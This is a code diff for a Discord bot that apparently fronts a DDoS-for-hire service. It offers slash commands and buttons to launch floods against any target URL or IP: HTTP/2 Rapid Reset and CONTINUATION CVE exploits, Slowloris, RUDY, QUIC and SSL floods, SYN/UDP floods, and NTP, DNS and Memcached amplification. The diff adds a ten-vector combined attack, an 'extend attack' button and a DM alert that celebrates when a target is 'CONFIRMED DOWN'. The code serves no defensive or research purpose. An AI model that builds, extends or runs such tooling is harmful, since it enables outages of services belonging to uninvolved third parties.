@@ -39,28 +39,32 @@ if (!BOT_TOKEN) {
 // ── Method definitions with layer grouping for the select menu ──────────────
 const METHOD_OPTIONS = [
   // ── Geass / Special ────────────────────────────────────────────────────
-  { value: "geass-override",      label: "👁️ Geass Override ∞",           description: "MAX POWER — 8 vectors: ConnFlood+Slow+H2RST+H2CONT+WAF+WS+GQL+UDP", emoji: "👁️" },
+  { value: "geass-override",      label: "👁️ Geass Override ∞",           description: "MAX POWER — 10 vectors (DECA): H2RST+H2CONT+WAF+WS+GQL+QUIC+SSL+...", emoji: "👁️" },
   // ── L7 Application ─────────────────────────────────────────────────────
-  { value: "waf-bypass",          label: "🟣 Geass WAF Bypass ∞",         description: "JA3+AKAMAI Chrome fingerprint — evades Cloudflare/Akamai WAF",       emoji: "🟣" },
-  { value: "http2-flood",         label: "⚡ HTTP/2 Rapid Reset",          description: "CVE-2023-44487 — 64-stream RST burst, millions req/s",               emoji: "⚡" },
-  { value: "http2-continuation",  label: "💀 H2 CONTINUATION (CVE-2024)", description: "CVE-2024-27316 — endless CONTINUATION frames, server OOM",          emoji: "💀" },
-  { value: "ws-flood",            label: "🕸️ WebSocket Exhaustion",       description: "Holds thousands of WS connections open — goroutine/thread per conn", emoji: "🕸️" },
-  { value: "graphql-dos",         label: "🔮 GraphQL Introspection DoS",   description: "Nested queries O(N^15) + alias bombs + batched introspection",       emoji: "🔮" },
-  { value: "slowloris",           label: "🐌 Slowloris",                  description: "25K half-open connections — starves nginx/apache thread pool",        emoji: "🐌" },
-  { value: "conn-flood",          label: "🔗 TLS Connection Flood",        description: "Opens & holds thousands of TLS sockets — pre-HTTP exhaustion",       emoji: "🔗" },
-  { value: "tls-renego",          label: "🔐 TLS Renegotiation DoS",      description: "Forces TLS 1.2 renegotiation — expensive public-key CPU per conn",   emoji: "🔐" },
-  { value: "http-flood",          label: "🌊 HTTP Flood",                  description: "High-volume HTTP GET — overwhelms web server resources",             emoji: "🌊" },
-  { value: "http-bypass",         label: "🛡️ HTTP Bypass",               description: "Browser-emulated HTTP flood — bypasses basic bot protection",        emoji: "🛡️" },
-  { value: "rudy",                label: "🩸 R.U.D.Y (SlowPOST)",         description: "Claims 1GB body, sends 1 byte/5s — holds server threads forever",   emoji: "🩸" },
+  { value: "waf-bypass",          label: "🟣 Geass WAF Bypass ∞",         description: "JA3+AKAMAI Chrome fingerprint — evades Cloudflare/Akamai WAF",        emoji: "🟣" },
+  { value: "http2-flood",         label: "⚡ HTTP/2 Rapid Reset",          description: "CVE-2023-44487 — 64-stream RST burst, millions req/s",                emoji: "⚡" },
+  { value: "http2-continuation",  label: "💀 H2 CONTINUATION (CVE-2024)", description: "CVE-2024-27316 — endless CONTINUATION frames, server OOM",           emoji: "💀" },
+  { value: "ws-flood",            label: "🕸️ WebSocket Exhaustion",       description: "Holds thousands of WS conns open — goroutine/thread per conn",        emoji: "🕸️" },
+  { value: "graphql-dos",         label: "🔮 GraphQL Introspection DoS",   description: "Nested queries O(N^15) + alias bombs + batched introspection",        emoji: "🔮" },
+  { value: "cache-poison",        label: "☠️ CDN Cache Poisoning DoS",    description: "Fills CDN cache with unique keys — 100% origin miss rate eviction",   emoji: "☠️" },
+  { value: "slowloris",           label: "🐌 Slowloris",                  description: "25K half-open connections — starves nginx/apache thread pool",         emoji: "🐌" },
+  { value: "conn-flood",          label: "🔗 TLS Connection Flood",        description: "Opens & holds thousands of TLS sockets — pre-HTTP exhaustion",        emoji: "🔗" },
+  { value: "tls-renego",          label: "🔐 TLS Renegotiation DoS",      description: "Forces TLS 1.2 renegotiation — expensive public-key CPU per conn",    emoji: "🔐" },
+  { value: "rudy",                label: "🩸 R.U.D.Y (SlowPOST)",         description: "Claims 1GB body, sends 1 byte/5s — holds server threads forever",    emoji: "🩸" },
+  { value: "rudy-v2",             label: "🩸 RUDY v2 — Multipart POST",   description: "multipart/form-data + 70-char boundary — harder to detect than RUDY", emoji: "🩸" },
+  { value: "http-flood",          label: "🌊 HTTP Flood",                  description: "High-volume HTTP GET — overwhelms web server resources",              emoji: "🌊" },
+  { value: "http-bypass",         label: "🛡️ HTTP Bypass",               description: "Browser-emulated HTTP flood — bypasses basic bot protection",         emoji: "🛡️" },
   // ── L4 Transport ───────────────────────────────────────────────────────
-  { value: "udp-flood",           label: "💥 UDP Flood",                  description: "Raw UDP packet flood — saturates L4 bandwidth",                      emoji: "💥" },
-  { value: "udp-bypass",          label: "🔀 UDP Bypass",                 description: "UDP flood with randomized payloads to evade rate limiting",           emoji: "🔀" },
-  { value: "syn-flood",           label: "🔌 SYN Flood",                  description: "TCP SYN_RECV exhaustion — fills connection table pre-handshake",      emoji: "🔌" },
-  { value: "tcp-flood",           label: "📡 TCP Flood",                  description: "Raw TCP packet flood against open ports",                             emoji: "📡" },
+  { value: "quic-flood",          label: "⚡ QUIC/HTTP3 Flood (RFC 9000)", description: "QUIC Initial packets — server allocates crypto state per DCID → OOM", emoji: "⚡" },
+  { value: "ssl-death",           label: "💀 SSL Death Record",            description: "1-byte TLS records — 40K AES-GCM decrypts/sec on server CPU",        emoji: "💀" },
+  { value: "udp-flood",           label: "💥 UDP Flood",                  description: "Raw UDP packet flood — saturates L4 bandwidth",                       emoji: "💥" },
+  { value: "udp-bypass",          label: "🔀 UDP Bypass",                 description: "UDP flood with randomized payloads to evade rate limiting",            emoji: "🔀" },
+  { value: "syn-flood",           label: "🔌 SYN Flood",                  description: "TCP SYN_RECV exhaustion — fills connection table pre-handshake",       emoji: "🔌" },
+  { value: "tcp-flood",           label: "📡 TCP Flood",                  description: "Raw TCP packet flood against open ports",                              emoji: "📡" },
   // ── L3 Amplification ───────────────────────────────────────────────────
-  { value: "ntp-amp",             label: "🕐 NTP Amplification [556x]",   description: "Monlist NTP abuse — 556× amplification factor",                      emoji: "🕐" },
-  { value: "dns-amp",             label: "📛 DNS Amplification [54x]",    description: "Open resolver abuse — 54× amplification factor",                     emoji: "📛" },
-  { value: "mem-amp",             label: "💾 Memcached [51000x]",         description: "Exposed Memcached — up to 51,000× amplification",                    emoji: "💾" },
+  { value: "ntp-amp",             label: "🕐 NTP Amplification [556x]",   description: "Monlist NTP abuse — 556× amplification factor",                       emoji: "🕐" },
+  { value: "dns-amp",             label: "📛 DNS Amplification [54x]",    description: "Open resolver abuse — 54× amplification factor",                      emoji: "📛" },
+  { value: "mem-amp",             label: "💾 Memcached [51000x]",         description: "Exposed Memcached — up to 51,000× amplification",                     emoji: "💾" },
 ];
 
 // ── Duration presets ─────────────────────────────────────────────────────────
@@ -140,7 +144,7 @@ const COMMANDS = [
 
   new SlashCommandBuilder()
     .setName("geass")
-    .setDescription("👁️ Launch Geass Override ∞ — maximum power, 5 simultaneous vectors")
+    .setDescription("👁️ Launch Geass Override ∞ — DECA-VECTOR maximum power, 10 simultaneous vectors")
     .addStringOption(opt =>
       opt.setName("target").setDescription("Target URL or IP (e.g. https://example.com)").setRequired(true)
     )
@@ -223,57 +227,113 @@ async function probeTarget(rawUrl: string): Promise<ProbeResult> {
 }
 
 // ── Live attack monitor ───────────────────────────────────────────────────────
-const monitors       = new Map<number, NodeJS.Timeout>();
-const prevPackets    = new Map<number, number>();
-const targetHistories = new Map<number, ProbeResult[]>();  // attackId → probe history
+const monitors        = new Map<number, NodeJS.Timeout>();
+const prevPackets     = new Map<number, number>();
+const targetHistories = new Map<number, ProbeResult[]>();
+const downAlertSent   = new Map<number, boolean>(); // prevent DM spam
 
-function startMonitor(attackId: number, msg: Message, target: string): void {
+// Module-level client ref (set in main()) for DM support
+let botClient: Client | null = null;
+
+function buildAttackButtons(attackId: number, running: boolean): ActionRowBuilder<ButtonBuilder> {
+  return new ActionRowBuilder<ButtonBuilder>().addComponents(
+    new ButtonBuilder()
+      .setCustomId(`stop_${attackId}`)
+      .setLabel("⏹️ Stop Attack")
+      .setStyle(ButtonStyle.Danger)
+      .setDisabled(!running),
+    new ButtonBuilder()
+      .setCustomId(`extend_${attackId}`)
+      .setLabel("⏱️ Extend +60s")
+      .setStyle(ButtonStyle.Primary)
+      .setDisabled(!running),
+  );
+}
+
+function startMonitor(attackId: number, msg: Message, target: string, userId?: string): void {
   if (monitors.has(attackId)) return;
-  const INTERVAL_MS = 7_000;  // 7s interval > 5s probe timeout → no stacking
-  targetHistories.set(attackId, []);  // init empty history
-  let busy = false;  // prevent overlapping ticks if probe hangs
+  const INTERVAL_MS = 7_000;
+  targetHistories.set(attackId, []);
+  downAlertSent.set(attackId, false);
+  let busy = false;
 
   const tick = setInterval(async () => {
-    if (busy) return;  // skip if previous tick is still running
+    if (busy) return;
     busy = true;
     try {
-    // Probe target + fetch attack state + live conns all in parallel
-    const [attack, live, probe] = await Promise.all([
-      api.getAttack(attackId),
-      api.getLiveConns(attackId).catch(() => ({ conns: 0, running: false })),
-      probeTarget(target).catch(() => ({ up: true, latencyMs: 5500, reason: "Probe inconclusive — outbound network under load" } as ProbeResult)),
-    ]);
+      const [attack, live, probe] = await Promise.all([
+        api.getAttack(attackId),
+        api.getLiveConns(attackId).catch(() => ({ conns: 0, running: false })),
+        probeTarget(target).catch(() => ({ up: true, latencyMs: 5500, reason: "Probe inconclusive — outbound network under load" } as ProbeResult)),
+      ]);
 
-    if (!attack) {
-      clearInterval(tick);
-      monitors.delete(attackId);
-      prevPackets.delete(attackId);
-      targetHistories.delete(attackId);
-      return;
-    }
+      if (!attack) {
+        clearInterval(tick);
+        monitors.delete(attackId);
+        prevPackets.delete(attackId);
+        targetHistories.delete(attackId);
+        downAlertSent.delete(attackId);
+        return;
+      }
 
-    // Maintain rolling history (max 30 probes = 2.5 min of history, shows last 20 in sparkline)
-    const history = targetHistories.get(attackId) ?? [];
-    history.push(probe);
-    if (history.length > 30) history.shift();
-    targetHistories.set(attackId, history);
+      const history = targetHistories.get(attackId) ?? [];
+      history.push(probe);
+      if (history.length > 30) history.shift();
+      targetHistories.set(attackId, history);
 
-    const prev    = prevPackets.get(attackId) ?? attack.packetsSent;
-    const delta   = Math.max(0, attack.packetsSent - prev);
-    const livePps = delta / (INTERVAL_MS / 1000);
-    prevPackets.set(attackId, attack.packetsSent);
+      const prev    = prevPackets.get(attackId) ?? attack.packetsSent;
+      const delta   = Math.max(0, attack.packetsSent - prev);
+      const livePps = delta / (INTERVAL_MS / 1000);
+      prevPackets.set(attackId, attack.packetsSent);
 
-    try {
-      await msg.edit({ embeds: [buildAttackEmbed(attack, livePps, live?.conns ?? 0, history)] });
-    } catch { /**/ }
+      const isRunning = attack.status === "running";
+      const row       = buildAttackButtons(attackId, isRunning);
 
-    if (attack.status !== "running") {
-      clearInterval(tick);
-      monitors.delete(attackId);
-      prevPackets.delete(attackId);
-      // Keep history for a final render, then clean up after 30s
-      setTimeout(() => targetHistories.delete(attackId), 30_000);
-    }
+      try {
+        await msg.edit({
+          embeds:     [buildAttackEmbed(attack, livePps, live?.conns ?? 0, history)],
+          components: [row],
+        });
+      } catch { /**/ }
+
+      // ── DM alert when target goes definitively DOWN ─────────────────────
+      if (
+        userId &&
+        botClient &&
+        !downAlertSent.get(attackId) &&
+        !probe.up &&
+        (probe.reason?.includes("refused") || probe.reason?.includes("DNS") || probe.reason?.includes("ENOTFOUND") || probe.reason?.includes("ECONNREFUSED"))
+      ) {
+        downAlertSent.set(attackId, true);
+        try {
+          const user = await botClient.users.fetch(userId);
+          await user.send({
+            embeds: [
+              new EmbedBuilder()
+                .setColor(COLORS.RED)
+                .setTitle("💀 TARGET CONFIRMED DOWN")
+                .setDescription(
+                  `> *"All opposition shall submit to the might of Geass."*\n\n` +
+                  `**Attack #${attackId}** — \`${target}\` has gone **DOWN**.`
+                )
+                .addFields(
+                  { name: "🎯 Target",   value: `\`${target}\``,             inline: true },
+                  { name: "⚔️ Method",   value: `\`${attack.method}\``,      inline: true },
+                  { name: "💀 Reason",   value: probe.reason ?? "ECONNREFUSED", inline: false },
+                )
+                .setFooter({ text: AUTHOR })
+                .setTimestamp(),
+            ],
+          });
+        } catch { /* DM may be blocked by user privacy settings */ }
+      }
+
+      if (!isRunning) {
+        clearInterval(tick);
+        monitors.delete(attackId);
+        prevPackets.delete(attackId);
+        setTimeout(() => { targetHistories.delete(attackId); downAlertSent.delete(attackId); }, 30_000);
+      }
     } finally { busy = false; }
   }, INTERVAL_MS);
   monitors.set(attackId, tick);
@@ -470,14 +530,14 @@ async function handleGeass(interaction: ChatInputCommandInteraction): Promise<vo
         .setTitle("👁️ LELOUCH vi BRITANNIA COMMANDS YOU...")
         .setDescription(
           `> *"I, Lelouch vi Britannia, hereby command all opposition... TO SUBMIT!"*\n\n` +
-          `⚡ **GEASS OVERRIDE** — 5 simultaneous vectors against \`${target}\`\n` +
-          `**Conn Flood → Slowloris → HTTP/2 Rapid Reset → WAF Bypass → UDP**`
+          `👁️ **GEASS OVERRIDE — DECA-VECTOR** — 10 simultaneous vectors against \`${target}\`\n` +
+          `**ConnFlood → Slowloris → H2 RST → H2 CONT → WAF Bypass → WS → GQL → UDP → QUIC → SSL Death**`
         )
         .addFields(
-          { name: "🎯 Target",  value: `\`${target}\``,        inline: true },
-          { name: "⏱ Duration", value: `**${duration}s**`,      inline: true },
-          { name: "🧵 Threads", value: `**${threads}** (base)`, inline: true },
-          { name: "📊 Status",  value: "🔴 **INITIALIZING VECTORS...**", inline: false },
+          { name: "🎯 Target",   value: `\`${target}\``,        inline: true },
+          { name: "⏱ Duration",  value: `**${duration}s**`,      inline: true },
+          { name: "🧵 Threads",  value: `**${threads}** (base)`, inline: true },
+          { name: "📊 Status",   value: "🔴 **INITIALIZING 10 VECTORS...**", inline: false },
         )
         .setFooter({ text: AUTHOR })
         .setTimestamp()
@@ -485,13 +545,12 @@ async function handleGeass(interaction: ChatInputCommandInteraction): Promise<vo
   });
 
   try {
-    const attack = await api.startAttack({ target, method: "geass-override", threads, duration, port });
-    console.log(`[GEASS #${attack.id}] Vectors online → ${target}`);
-    const row = new ActionRowBuilder<ButtonBuilder>().addComponents(
-      new ButtonBuilder().setCustomId(`stop_${attack.id}`).setLabel("⏹️ Stop Geass").setStyle(ButtonStyle.Danger),
-    );
-    const msg = await interaction.editReply({ embeds: [buildStartEmbed(attack)], components: [row] });
-    startMonitor(attack.id, msg as Message, target);
+    const attack  = await api.startAttack({ target, method: "geass-override", threads, duration, port });
+    console.log(`[GEASS #${attack.id}] 10 Vectors online → ${target}`);
+    const row     = buildAttackButtons(attack.id, true);
+    const msg     = await interaction.editReply({ embeds: [buildStartEmbed(attack)], components: [row] });
+    const userId  = interaction.user.id;
+    startMonitor(attack.id, msg as Message, target, userId);
   } catch (err: unknown) {
     const message = err instanceof Error ? err.message : String(err);
     await interaction.editReply({ embeds: [buildErrorEmbed("GEASS FAILED", message)] });
@@ -570,13 +629,12 @@ async function handleButton(interaction: import("discord.js").ButtonInteraction)
     console.log(`[ATTACK START] ${interaction.user.tag} → ${target} | ${method} | ${threads}t | ${duration}s`);
 
     try {
-      const attack = await api.startAttack({ target, method, threads, duration, port });
-      const row = new ActionRowBuilder<ButtonBuilder>().addComponents(
-        new ButtonBuilder().setCustomId(`stop_${attack.id}`).setLabel("⏹️ Stop Attack").setStyle(ButtonStyle.Danger),
-      );
-      const msg = await interaction.editReply({ embeds: [buildStartEmbed(attack)], components: [row] });
+      const attack  = await api.startAttack({ target, method, threads, duration, port });
+      const row     = buildAttackButtons(attack.id, true);
+      const msg     = await interaction.editReply({ embeds: [buildStartEmbed(attack)], components: [row] });
+      const userId  = interaction.user.id;
       console.log(`[ATTACK #${attack.id}] Started — ${method} → ${target}`);
-      startMonitor(attack.id, msg as Message, target);
+      startMonitor(attack.id, msg as Message, target, userId);
     } catch (err: unknown) {
       const message = err instanceof Error ? err.message : String(err);
       await interaction.editReply({ embeds: [buildErrorEmbed("ATTACK FAILED", message)], components: [] });
@@ -602,10 +660,9 @@ async function handleButton(interaction: import("discord.js").ButtonInteraction)
     return;
   }
 
-  // ── Stop button (existing attacks) ────────────────────────────────────────
-  const parts = customId.split("_");
-  if (parts[0] === "stop" && parts[1]) {
-    const id = parseInt(parts[1], 10);
+  // ── Stop button ───────────────────────────────────────────────────────────
+  if (customId.startsWith("stop_")) {
+    const id = parseInt(customId.slice(5), 10);
     await interaction.deferReply({ ephemeral: true });
     try {
       const result = await api.stopAttack(id);
@@ -617,6 +674,32 @@ async function handleButton(interaction: import("discord.js").ButtonInteraction)
     } catch {
       await interaction.editReply({ embeds: [buildStopEmbed(id, false)] });
     }
+    return;
+  }
+
+  // ── Extend +60s button ────────────────────────────────────────────────────
+  if (customId.startsWith("extend_")) {
+    const id = parseInt(customId.slice(7), 10);
+    await interaction.deferReply({ ephemeral: true });
+    try {
+      const result = await api.extendAttack(id, 60);
+      await interaction.editReply({
+        embeds: [
+          new EmbedBuilder()
+            .setColor(COLORS.GOLD)
+            .setTitle("⏱️ ATTACK EXTENDED")
+            .setDescription(`Attack **#${id}** extended by **+60 seconds**.\nNew total duration: **${result.duration}s**`)
+            .setFooter({ text: AUTHOR })
+            .setTimestamp(),
+        ],
+      });
+      console.log(`[BUTTON] ${interaction.user.tag} extended attack #${id} +60s`);
+    } catch {
+      await interaction.editReply({
+        embeds: [buildErrorEmbed("EXTEND FAILED", "Attack may have already finished.")],
+      });
+    }
+    return;
   }
 }
 
@@ -624,7 +707,8 @@ async function handleButton(interaction: import("discord.js").ButtonInteraction)
 async function main(): Promise<void> {
   await deployCommands();
 
-  const client = new Client({ intents: [GatewayIntentBits.Guilds] });
+  const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.DirectMessages] });
+  botClient = client; // make accessible for DM alerts
 
   client.once(Events.ClientReady, c => {
     console.log(`\n╔════════════════════════════════════════╗`);
